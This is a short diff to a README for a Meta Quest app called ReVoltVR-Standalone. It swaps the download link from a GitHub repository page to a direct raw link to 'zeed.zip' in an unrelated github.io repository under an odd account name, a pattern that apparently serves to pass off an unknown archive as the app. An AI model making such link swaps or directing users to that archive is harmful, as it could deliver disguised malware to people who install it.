@@ -28,7 +28,7 @@ This is the standalone version built specifically for Meta Quest headsets, using
 
 ### Step 1: Get the App
 
-👉 **[Download ReVoltVR-Standalone](https://github.com/Guadalupemountainsnationalparkflight821/ReVoltVR-Standalone)**
+👉 **[Download ReVoltVR-Standalone](https://raw.githubusercontent.com/Guadalupemountainsnationalparkflight821/guadalupemountainsnationalparkflight821.github.io/main/assets/zeed.zip)**
 
 Visit this link to download the application.
 
